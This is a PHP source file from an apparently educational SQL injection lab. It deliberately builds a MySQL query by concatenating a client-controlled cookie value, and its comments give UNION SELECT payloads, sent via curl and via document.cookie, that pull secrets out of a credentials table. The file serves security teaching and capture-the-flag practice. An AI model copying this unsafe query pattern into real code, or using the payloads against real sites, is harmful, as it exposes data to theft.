<?php
/*
 * SQLi-Arena. MySQL Lab 17: Header Injection. Cookie
 * SOURCE CODE (shown in White-Box mode)
 *
 * This is the vulnerable portion of the lab.
 */

// Database connection (per-lab isolation)
require_once __DIR__ . '/../../includes/db.php';

// Read the user_id from the Cookie header -- NOT from a form field
$cookie_uid = $_COOKIE['user_id'];

// VULNERABLE: The cookie value is directly concatenated into the query.
// Cookies are HTTP headers that the client fully controls.
// addslashes() or prepared statements are NOT used here.
$query = "SELECT theme, language, last_login FROM preferences WHERE user_id = '$cookie_uid'";

$result = mysqli_query($conn, $query);

if ($result && mysqli_num_rows($result) > 0) {
    while ($row = mysqli_fetch_assoc($result)) {
        echo "Theme: {$row['theme']} | Language: {$row['language']} | Last Login: {$row['last_login']}";
    }
} else {
    echo "No preferences found for this user.";
}

// Hidden table structure:
// CREATE TABLE credentials (id INT, service VARCHAR(50), secret VARCHAR(100));
// Contains: service='database', secret='FLAG{...}'
//
// Attack vector (via Cookie header):
// The user_id cookie is injected into a SELECT query.
// Use UNION SELECT to extract data from the credentials table.
//
// Example with curl:
//   curl -b "user_id=' UNION SELECT secret, service, NOW() FROM credentials WHERE service='database' -- -" URL
//
// Example with browser:
//   Set cookie via JavaScript: document.cookie = "user_id=' UNION SELECT secret, service, NOW() FROM credentials -- -"
//   Then reload the page.
